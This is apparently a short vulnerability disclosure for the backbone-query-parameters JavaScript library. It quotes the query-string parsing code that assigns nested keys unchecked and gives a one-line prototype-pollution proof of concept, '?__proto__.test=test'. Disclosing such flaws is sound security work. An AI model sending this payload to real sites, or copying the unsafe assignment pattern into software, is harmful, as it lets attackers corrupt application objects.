## backbone-query-parameters

URL: https://github.com/jhudson8/backbone-query-parameters

### Vulnerable code fragment

https://github.com/jhudson8/backbone-query-parameters/blob/master/backbone.queryparams.js

```js
  _extractParameters: function(route, fragment) {
    ...
      if (queryString) {
        var self = this;
        iterateQueryString(queryString, function(name, value) {
          self._setParamValue(name, value, data);

  ...

  _setParamValue: function(key, value, data) {
    // use '.' to define hash separators
    key = key.replace('[]', '');
    key = key.replace('%5B%5D', '');
    var parts = key.split('.');
    var _data = data;
    for (var i=0; i<parts.length; i++) {
      var part = decodeURIComponent(parts[i]);
      if (i === parts.length-1) {
        // set the value
        _data[part] = this._decodeParamValue(value, _data[part]);
      } else {
        _data = _data[part] = _data[part] || {};
      }
    }
  },
```

### PoC
```
?__proto__.test=test
```